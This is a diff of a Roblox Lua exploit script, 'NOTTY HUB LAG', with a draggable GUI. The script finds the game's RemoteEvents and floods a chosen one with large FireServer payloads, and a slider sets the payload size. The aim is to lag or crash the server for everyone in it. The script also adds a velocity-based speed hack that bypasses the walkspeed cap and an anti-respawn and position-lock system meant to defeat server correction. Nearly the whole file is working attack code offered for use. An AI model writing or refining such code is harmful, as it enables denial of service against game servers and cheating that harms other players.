@@ -1,190 +1,578 @@
+-- NOTTY HUB LAG 1.0
+-- Features: Ping Lagger (E) + Speed Boost to 60 (F) + Dark Sky Blue Theme
+-- Toggle UI with U
+-- Anti-Respawn & Position Lock System
+-- Mobile-Friendly Speed & Data Payload Sliders
+
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local lagModeEnabled = false
+local speedBoostEnabled = false
+local boostedWalkSpeed = 60
+local dataPayloadSize = 6778
+
 local uniqueIdentifier = "v15g2119-134z-bx1c-a143-415a31g1l029"
-local dataPayload = string.rep("z", 30000)
+local dataPayload = string.rep("z", dataPayloadSize)
 local remoteEventTarget = nil
 local allRemotes = {}
+local isRemoteSupported = false
 
--- Keywords to search for
+-- Position locking variables
+local savedPosition = nil
+local savedCharacter = nil
+local antiRespawnActive = true
+
+-- Dark Sky Blue theme colors
+local COLOR_BG_DARK = Color3.fromRGB(35, 50, 65)
+local COLOR_TITLE = Color3.fromRGB(25, 40, 55)
+local COLOR_ACCENT = Color3.fromRGB(70, 130, 180)
+local COLOR_ACCENT_OFF = Color3.fromRGB(50, 90, 130)
+local COLOR_TEXT = Color3.fromRGB(200, 220, 240)
+local COLOR_TEXT_DIM = Color3.fromRGB(150, 170, 200)
+local COLOR_GREEN = Color3.fromRGB(0, 200, 80)
+local COLOR_RED = Color3.fromRGB(220, 50, 50)
+local COLOR_ORANGE = Color3.fromRGB(255, 165, 0)
+
+-- Keywords for remote auto-target
 local targetKeywords = {"RobloxChatSystemMessage", "AFK", "FisherMan"}
 
--- Find all remotes
-for index, gameObject in pairs(game:GetDescendants()) do
-    if gameObject:IsA("RemoteEvent") and gameObject.Name ~= "friendmain" and gameObject.Name ~= "ping" then
-        table.insert(allRemotes, gameObject)
+-- Find remotes
+for _, obj in ipairs(game:GetDescendants()) do
+    if obj:IsA("RemoteEvent") and not obj.Name:lower():match("ping") and not obj.Name:lower():match("friend") then
+        table.insert(allRemotes, obj)
     end
 end
 
--- Auto-select first remote containing target keywords
-for _, remote in pairs(allRemotes) do
-    local remoteName = remote.Name:lower()
-    for _, keyword in pairs(targetKeywords) do
-        if remoteName:find(keyword:lower()) then
+-- Auto-select best remote and check if supported
+for _, remote in ipairs(allRemotes) do
+    local nameLower = remote.Name:lower()
+    for _, kw in ipairs(targetKeywords) do
+        if nameLower:find(kw:lower()) then
             remoteEventTarget = remote
-            print("✅ Auto-selected: " .. remote.Name)
+            isRemoteSupported = true
+            print("NOTTY HUB: Selected target - " .. remote.Name)
             break
         end
     end
     if remoteEventTarget then break end
 end
 
--- Fallback if no keyword match found
 if not remoteEventTarget and #allRemotes > 0 then
-    print("⚠️ No keyword match found, using first available remote")
     remoteEventTarget = allRemotes[1]
+    isRemoteSupported = false
+    print("NOTTY HUB: Fallback to " .. remoteEventTarget.Name .. " (Not Supported)")
 end
 
--- Create GUI
+-- GUI (Dark Sky Blue Theme)
 local playerGui = player:WaitForChild("PlayerGui")
+if playerGui:FindFirstChild("NottyHubGui") then playerGui.NottyHubGui:Destroy() end
 
-if playerGui:FindFirstChild("LaggerGui") then
-    playerGui:FindFirstChild("LaggerGui"):Destroy()
-end
+local sg = Instance.new("ScreenGui")
+sg.Name = "NottyHubGui"
+sg.ResetOnSpawn = false
+sg.Parent = playerGui
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LaggerGui"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 320, 0, 180)
-mainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 320, 0, 370)
+frame.Position = UDim2.new(0.5, -160, 0.5, -185)
+frame.BackgroundColor3 = COLOR_BG_DARK
+frame.BorderSizePixel = 0
+frame.Parent = sg
 
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = mainFrame
+corner.Parent = frame
 
 local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(100, 100, 120)
-stroke.Thickness = 2
-stroke.Parent = mainFrame
+stroke.Color = COLOR_ACCENT
+stroke.Thickness = 1.5
+stroke.Transparency = 0.3
+stroke.Parent = frame
 
 local titleBar = Instance.new("Frame")
 titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+titleBar.BackgroundColor3 = COLOR_TITLE
 titleBar.BorderSizePixel = 0
-titleBar.Parent = mainFrame
+titleBar.Parent = frame
 
 local titleCorner = Instance.new("UICorner")
 titleCorner.CornerRadius = UDim.new(0, 12)
 titleCorner.Parent = titleBar
 
-local titleCover = Instance.new("Frame")
-titleCover.Size = UDim2.new(1, 0, 0, 20)
-titleCover.Position = UDim2.new(0, 0, 1, -20)
-titleCover.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-titleCover.BorderSizePixel = 0
-titleCover.Parent = titleBar
-
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, -20, 1, 0)
 title.Position = UDim2.new(0, 10, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "⚡ NOTTY SAB CRASHER"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 18
+title.Text = "NOTTY LAG SPEED BOOSTER"
+title.TextColor3 = COLOR_TEXT
 title.Font = Enum.Font.GothamBold
+title.TextSize = 20
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = titleBar
 
--- Remote Info
+-- Remote Status Label
 local remoteLabel = Instance.new("TextLabel")
-remoteLabel.Size = UDim2.new(1, -20, 0, 30)
+remoteLabel.Size = UDim2.new(1, -20, 0, 25)
 remoteLabel.Position = UDim2.new(0, 10, 0, 55)
 remoteLabel.BackgroundTransparency = 1
-remoteLabel.Text = (remoteEventTarget and remoteEventTarget.Name or "NOT FOUND")
-remoteLabel.TextColor3 = remoteEventTarget and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
-remoteLabel.TextSize = 12
-remoteLabel.Font = Enum.Font.GothamBold
+remoteLabel.Font = Enum.Font.Gotham
+remoteLabel.TextSize = 13
 remoteLabel.TextXAlignment = Enum.TextXAlignment.Left
-remoteLabel.TextTruncate = Enum.TextTruncate.AtEnd
-remoteLabel.Parent = mainFrame
+remoteLabel.Parent = frame
+
+if remoteEventTarget then
+    if isRemoteSupported then
+        remoteLabel.Text = "✓ Supported Remote"
+        remoteLabel.TextColor3 = COLOR_GREEN
+    else
+        remoteLabel.Text = "✗ Remote Not Supported\nPlease rejoin the experience to try again"
+        remoteLabel.TextColor3 = COLOR_ORANGE
+        remoteLabel.TextSize = 11
+    end
+else
+    remoteLabel.Text = "✗ No Remote Found"
+    remoteLabel.TextColor3 = COLOR_RED
+end
 
 -- Lag Button
-local lagButton = Instance.new("TextButton")
-lagButton.Size = UDim2.new(1, -20, 0, 50)
-lagButton.Position = UDim2.new(0, 10, 0, 95)
-lagButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-lagButton.BorderSizePixel = 0
-lagButton.Text = "Start Crash (Press E)"
-lagButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-lagButton.TextSize = 16
-lagButton.Font = Enum.Font.GothamBold
-lagButton.Parent = mainFrame
+local lagBtn = Instance.new("TextButton")
+lagBtn.Size = UDim2.new(1, -20, 0, 50)
+lagBtn.Position = UDim2.new(0, 10, 0, 90)
+lagBtn.BackgroundColor3 = COLOR_RED
+lagBtn.Text = "START LAG (E)"
+lagBtn.TextColor3 = Color3.new(1,1,1)
+lagBtn.Font = Enum.Font.GothamBold
+lagBtn.TextSize = 16
+lagBtn.Parent = frame
+local lagCorner = Instance.new("UICorner"); lagCorner.CornerRadius = UDim.new(0, 10); lagCorner.Parent = lagBtn
 
-local lagCorner = Instance.new("UICorner")
-lagCorner.CornerRadius = UDim.new(0, 8)
-lagCorner.Parent = lagButton
+-- Speed Button
+local speedBtn = Instance.new("TextButton")
+speedBtn.Size = UDim2.new(1, -20, 0, 50)
+speedBtn.Position = UDim2.new(0, 10, 0, 150)
+speedBtn.BackgroundColor3 = COLOR_ACCENT_OFF
+speedBtn.Text = "SPEED BOOST OFF (F)"
+speedBtn.TextColor3 = Color3.new(1,1,1)
+speedBtn.Font = Enum.Font.GothamBold
+speedBtn.TextSize = 16
+speedBtn.Parent = frame
+local speedCorner = Instance.new("UICorner"); speedCorner.CornerRadius = UDim.new(0, 10); speedCorner.Parent = speedBtn
+
+-- Speed Slider Label
+local speedLabel = Instance.new("TextLabel")
+speedLabel.Size = UDim2.new(1, -20, 0, 20)
+speedLabel.Position = UDim2.new(0, 10, 0, 210)
+speedLabel.BackgroundTransparency = 1
+speedLabel.Text = "Speed: " .. boostedWalkSpeed
+speedLabel.TextColor3 = COLOR_TEXT
+speedLabel.Font = Enum.Font.GothamBold
+speedLabel.TextSize = 14
+speedLabel.TextXAlignment = Enum.TextXAlignment.Center
+speedLabel.Parent = frame
+
+-- Speed Slider Background
+local speedSliderBG = Instance.new("Frame")
+speedSliderBG.Size = UDim2.new(1, -20, 0, 30)
+speedSliderBG.Position = UDim2.new(0, 10, 0, 235)
+speedSliderBG.BackgroundColor3 = Color3.fromRGB(20, 30, 40)
+speedSliderBG.BorderSizePixel = 0
+speedSliderBG.Parent = frame
+local speedSliderBGCorner = Instance.new("UICorner"); speedSliderBGCorner.CornerRadius = UDim.new(0, 8); speedSliderBGCorner.Parent = speedSliderBG
+
+-- Speed Slider Fill
+local speedSliderFill = Instance.new("Frame")
+speedSliderFill.Size = UDim2.new(0.5, 0, 1, 0)
+speedSliderFill.BackgroundColor3 = COLOR_ACCENT
+speedSliderFill.BorderSizePixel = 0
+speedSliderFill.Parent = speedSliderBG
+local speedSliderFillCorner = Instance.new("UICorner"); speedSliderFillCorner.CornerRadius = UDim.new(0, 8); speedSliderFillCorner.Parent = speedSliderFill
+
+-- Speed Slider Knob
+local speedSliderKnob = Instance.new("Frame")
+speedSliderKnob.Size = UDim2.new(0, 20, 1, 0)
+speedSliderKnob.Position = UDim2.new(0.5, -10, 0, 0)
+speedSliderKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+speedSliderKnob.BorderSizePixel = 0
+speedSliderKnob.Parent = speedSliderBG
+local speedSliderKnobCorner = Instance.new("UICorner"); speedSliderKnobCorner.CornerRadius = UDim.new(0, 10); speedSliderKnobCorner.Parent = speedSliderKnob
+
+-- Data Payload Slider Label
+local payloadLabel = Instance.new("TextLabel")
+payloadLabel.Size = UDim2.new(1, -20, 0, 20)
+payloadLabel.Position = UDim2.new(0, 10, 0, 275)
+payloadLabel.BackgroundTransparency = 1
+payloadLabel.Text = "Payload: " .. dataPayloadSize
+payloadLabel.TextColor3 = COLOR_TEXT
+payloadLabel.Font = Enum.Font.GothamBold
+payloadLabel.TextSize = 14
+payloadLabel.TextXAlignment = Enum.TextXAlignment.Center
+payloadLabel.Parent = frame
+
+-- Data Payload Slider Background
+local payloadSliderBG = Instance.new("Frame")
+payloadSliderBG.Size = UDim2.new(1, -20, 0, 30)
+payloadSliderBG.Position = UDim2.new(0, 10, 0, 300)
+payloadSliderBG.BackgroundColor3 = Color3.fromRGB(20, 30, 40)
+payloadSliderBG.BorderSizePixel = 0
+payloadSliderBG.Parent = frame
+local payloadSliderBGCorner = Instance.new("UICorner"); payloadSliderBGCorner.CornerRadius = UDim.new(0, 8); payloadSliderBGCorner.Parent = payloadSliderBG
+
+-- Data Payload Slider Fill
+local payloadSliderFill = Instance.new("Frame")
+payloadSliderFill.Size = UDim2.new(0.58, 0, 1, 0)
+payloadSliderFill.BackgroundColor3 = COLOR_RED
+payloadSliderFill.BorderSizePixel = 0
+payloadSliderFill.Parent = payloadSliderBG
+local payloadSliderFillCorner = Instance.new("UICorner"); payloadSliderFillCorner.CornerRadius = UDim.new(0, 8); payloadSliderFillCorner.Parent = payloadSliderFill
+
+-- Data Payload Slider Knob
+local payloadSliderKnob = Instance.new("Frame")
+payloadSliderKnob.Size = UDim2.new(0, 20, 1, 0)
+payloadSliderKnob.Position = UDim2.new(0.58, -10, 0, 0)
+payloadSliderKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+payloadSliderKnob.BorderSizePixel = 0
+payloadSliderKnob.Parent = payloadSliderBG
+local payloadSliderKnobCorner = Instance.new("UICorner"); payloadSliderKnobCorner.CornerRadius = UDim.new(0, 10); payloadSliderKnobCorner.Parent = payloadSliderKnob
 
 -- Info
 local infoLabel = Instance.new("TextLabel")
 infoLabel.Size = UDim2.new(1, -20, 0, 20)
-infoLabel.Position = UDim2.new(0, 10, 0, 155)
+infoLabel.Position = UDim2.new(0, 10, 1, -30)
 infoLabel.BackgroundTransparency = 1
-infoLabel.Text = "E = Crash | U = Toggle UI"
-infoLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
-infoLabel.TextSize = 10
+infoLabel.Text = "E = Lag | F = Speed | U = Hide UI"
+infoLabel.TextColor3 = COLOR_TEXT_DIM
 infoLabel.Font = Enum.Font.Gotham
-infoLabel.TextXAlignment = Enum.TextXAlignment.Center
-infoLabel.Parent = mainFrame
+infoLabel.TextSize = 12
+infoLabel.Parent = frame
 
--- Update Display
-local function updateDisplay()
+-- Update UI
+local function updateLagUI()
     if lagModeEnabled then
-        lagButton.Text = "Stop Crash (Press E)"
-        lagButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        lagBtn.Text = "STOP LAG (E)"
+        lagBtn.BackgroundColor3 = Color3.fromRGB(60, 100, 140)
     else
-        lagButton.Text = "Start Crash (Press E)"
-        lagButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+        lagBtn.Text = "START LAG (E)"
+        lagBtn.BackgroundColor3 = COLOR_RED
     end
 end
 
--- Lag Button Click
-lagButton.MouseButton1Click:Connect(function()
-    lagModeEnabled = not lagModeEnabled
-    updateDisplay()
-end)
+local function updateSpeedUI()
+    if speedBoostEnabled then
+        speedBtn.Text = "SPEED BOOST ON (F)"
+        speedBtn.BackgroundColor3 = COLOR_ACCENT
+    else
+        speedBtn.Text = "SPEED BOOST OFF (F)"
+        speedBtn.BackgroundColor3 = COLOR_ACCENT_OFF
+    end
+end
 
--- Keybinds
-UserInputService.InputBegan:Connect(function(inputObject, isGameProcessed)
-    if not isGameProcessed and inputObject.KeyCode == Enum.KeyCode.E then
-        lagModeEnabled = not lagModeEnabled
-        updateDisplay()
-    elseif not isGameProcessed and inputObject.KeyCode == Enum.KeyCode.U then
-        mainFrame.Visible = not mainFrame.Visible
+-- Update speed slider visuals
+local function updateSpeedSlider()
+    local minSpeed = 16
+    local maxSpeed = 120
+    local percentage = (boostedWalkSpeed - minSpeed) / (maxSpeed - minSpeed)
+    
+    speedSliderFill.Size = UDim2.new(percentage, 0, 1, 0)
+    speedSliderKnob.Position = UDim2.new(percentage, -10, 0, 0)
+    speedLabel.Text = "Speed: " .. math.floor(boostedWalkSpeed)
+end
+
+-- Update payload slider visuals
+local function updatePayloadSlider()
+    local minPayload = 1000
+    local maxPayload = 10000
+    local percentage = (dataPayloadSize - minPayload) / (maxPayload - minPayload)
+    
+    payloadSliderFill.Size = UDim2.new(percentage, 0, 1, 0)
+    payloadSliderKnob.Position = UDim2.new(percentage, -10, 0, 0)
+    payloadLabel.Text = "Payload: " .. math.floor(dataPayloadSize)
+    
+    -- Update dataPayload string
+    dataPayload = string.rep("z", dataPayloadSize)
+end
+
+-- Speed Slider dragging logic (works on mobile & PC)
+local draggingSpeedSlider = false
+
+speedSliderBG.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSpeedSlider = true
     end
 end)
 
--- Original lag logic
-RunService.Heartbeat:Connect(function()
-    if lagModeEnabled and remoteEventTarget then
-        for iteration = 1, 1 do
-            remoteEventTarget:FireServer(uniqueIdentifier, dataPayload)
+speedSliderBG.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingSpeedSlider = false
+    end
+end)
+
+speedSliderBG.InputChanged:Connect(function(input)
+    if draggingSpeedSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local sliderSize = speedSliderBG.AbsoluteSize.X
+        local relativeX = input.Position.X - speedSliderBG.AbsolutePosition.X
+        local percentage = math.clamp(relativeX / sliderSize, 0, 1)
+        
+        local minSpeed = 16
+        local maxSpeed = 120
+        boostedWalkSpeed = minSpeed + (percentage * (maxSpeed - minSpeed))
+        
+        updateSpeedSlider()
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if draggingSpeedSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local sliderSize = speedSliderBG.AbsoluteSize.X
+        local relativeX = input.Position.X - speedSliderBG.AbsolutePosition.X
+        local percentage = math.clamp(relativeX / sliderSize, 0, 1)
+        
+        local minSpeed = 16
+        local maxSpeed = 120
+        boostedWalkSpeed = minSpeed + (percentage * (maxSpeed - minSpeed))
+        
+        updateSpeedSlider()
+    end
+end)
+
+-- Payload Slider dragging logic (works on mobile & PC)
+local draggingPayloadSlider = false
+
+payloadSliderBG.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingPayloadSlider = true
+    end
+end)
+
+payloadSliderBG.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingPayloadSlider = false
+    end
+end)
+
+payloadSliderBG.InputChanged:Connect(function(input)
+    if draggingPayloadSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local sliderSize = payloadSliderBG.AbsoluteSize.X
+        local relativeX = input.Position.X - payloadSliderBG.AbsolutePosition.X
+        local percentage = math.clamp(relativeX / sliderSize, 0, 1)
+        
+        local minPayload = 1000
+        local maxPayload = 10000
+        dataPayloadSize = math.floor(minPayload + (percentage * (maxPayload - minPayload)))
+        
+        updatePayloadSlider()
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if draggingPayloadSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local sliderSize = payloadSliderBG.AbsoluteSize.X
+        local relativeX = input.Position.X - payloadSliderBG.AbsolutePosition.X
+        local percentage = math.clamp(relativeX / sliderSize, 0, 1)
+        
+        local minPayload = 1000
+        local maxPayload = 10000
+        dataPayloadSize = math.floor(minPayload + (percentage * (maxPayload - minPayload)))
+        
+        updatePayloadSlider()
+    end
+end)
+
+-- ANTI-RESPAWN SYSTEM
+local function setupAntiRespawn()
+    player.CharacterAdded:Connect(function(newChar)
+        if antiRespawnActive and savedCharacter and savedCharacter.Parent then
+            newChar:Destroy()
+            print("NOTTY HUB: Blocked respawn attempt")
+            
+            if not savedCharacter.Parent then
+                savedCharacter.Parent = workspace
+            end
+            
+            if savedPosition and savedCharacter:FindFirstChild("HumanoidRootPart") then
+                savedCharacter.HumanoidRootPart.CFrame = savedPosition
+            end
+        else
+            savedCharacter = newChar
+        end
+    end)
+    
+    if player.Character then
+        savedCharacter = player.Character
+        
+        player.Character.AncestryChanged:Connect(function(child, parent)
+            if antiRespawnActive and not parent and savedCharacter then
+                task.wait(0.1)
+                if savedCharacter and not savedCharacter.Parent then
+                    savedCharacter.Parent = workspace
+                    
+                    if savedPosition and savedCharacter:FindFirstChild("HumanoidRootPart") then
+                        savedCharacter.HumanoidRootPart.CFrame = savedPosition
+                    end
+                    print("NOTTY HUB: Restored character")
+                end
+            end
+        end)
+    end
+end
+
+-- Position saver
+task.spawn(function()
+    while true do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            savedPosition = player.Character.HumanoidRootPart.CFrame
+            savedCharacter = player.Character
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- NEW AGGRESSIVE SPEED BOOST (AssemblyLinearVelocity method)
+local speedConnection = nil
+
+local function enableSpeedBoost()
+    if speedConnection then
+        speedConnection:Disconnect()
+        speedConnection = nil
+    end
+    
+    speedConnection = RunService.Heartbeat:Connect(function(deltaTime)
+        if not speedBoostEnabled then return end
+        
+        local character = player.Character
+        if not character then return end
+        
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+        
+        if not humanoid or not humanoidRootPart then return end
+        
+        local moveDir = humanoid.MoveDirection
+        
+        if moveDir.Magnitude > 0 then
+            -- Aggressive velocity-based speed (ignores walkspeed cap)
+            humanoidRootPart.AssemblyLinearVelocity = Vector3.new(
+                moveDir.X * boostedWalkSpeed,
+                humanoidRootPart.AssemblyLinearVelocity.Y,  -- preserve Y (jump/fall)
+                moveDir.Z * boostedWalkSpeed
+            )
+        end
+    end)
+end
+
+local function disableSpeedBoost()
+    if speedConnection then
+        speedConnection:Disconnect()
+        speedConnection = nil
+    end
+end
+
+player.CharacterAdded:Connect(function(char)
+    wait(0.5)
+    if speedBoostEnabled then
+        enableSpeedBoost()
+    end
+end)
+
+-- Position lock
+local function lockPositionOnLagStop()
+    if savedPosition and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local hrp = player.Character.HumanoidRootPart
+        hrp.CFrame = savedPosition
+        hrp.Anchored = true
+        
+        task.wait(0.5)
+        
+        if hrp and hrp.Parent then
+            hrp.Anchored = false
+        end
+        
+        print("NOTTY HUB: Position locked, lagback prevented")
+    end
+end
+
+-- Button / Keybinds
+lagBtn.MouseButton1Click:Connect(function()
+    lagModeEnabled = not lagModeEnabled
+    updateLagUI()
+    
+    if not lagModeEnabled then
+        lockPositionOnLagStop()
+    end
+end)
+
+speedBtn.MouseButton1Click:Connect(function()
+    speedBoostEnabled = not speedBoostEnabled
+    updateSpeedUI()
+    
+    if speedBoostEnabled then
+        enableSpeedBoost()
+    else
+        disableSpeedBoost()
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.E then
+        lagModeEnabled = not lagModeEnabled
+        updateLagUI()
+        
+        if not lagModeEnabled then
+            lockPositionOnLagStop()
+        end
+    elseif input.KeyCode == Enum.KeyCode.F then
+        speedBoostEnabled = not speedBoostEnabled
+        updateSpeedUI()
+        
+        if speedBoostEnabled then
+            enableSpeedBoost()
+        else
+            disableSpeedBoost()
+        end
+    elseif input.KeyCode == Enum.KeyCode.U then
+        frame.Visible = not frame.Visible
+    end
+end)
+
+-- Initial setup
+if player.Character then 
+    savedCharacter = player.Character
+end
+
+setupAntiRespawn()
+updateSpeedSlider()
+updatePayloadSlider()
+
+-- Lag spam loop
+task.spawn(function()
+    while true do
+        if lagModeEnabled and remoteEventTarget then
+            for i = 1, 6 do
+                task.delay(math.random(1,5)/200, function()
+                    pcall(function()
+                        remoteEventTarget:FireServer(uniqueIdentifier, dataPayload)
+                    end)
+                end)
+            end
+            task.wait(0.12)
+        else
+            task.wait(0.2)
         end
     end
 end)
 
--- Draggable Main Frame (Mobile & PC)
-local dragging = false
-local dragStart, startPos
-
+-- Draggable (title bar only)
+local dragging, dragStart, startPos
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
-        startPos = mainFrame.Position
-        
+        startPos = frame.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
         end)
     end
 end)
@@ -192,18 +580,8 @@ end)
 UserInputService.InputChanged:Connect(function(input)
     if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
-        mainFrame.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
 
-print("⚡ Notty Sab Crasher Loaded!")
-print("Found " .. #allRemotes .. " remotes")
-print("Target: " .. (remoteEventTarget and remoteEventTarget.Name or "NOT FOUND"))
-print("📱 Mobile friendly - Touch to drag")
-print("Press E to toggle crash | U to toggle UI")
-
+print("NOTTY HUB LAG SPEED ACTIVE)
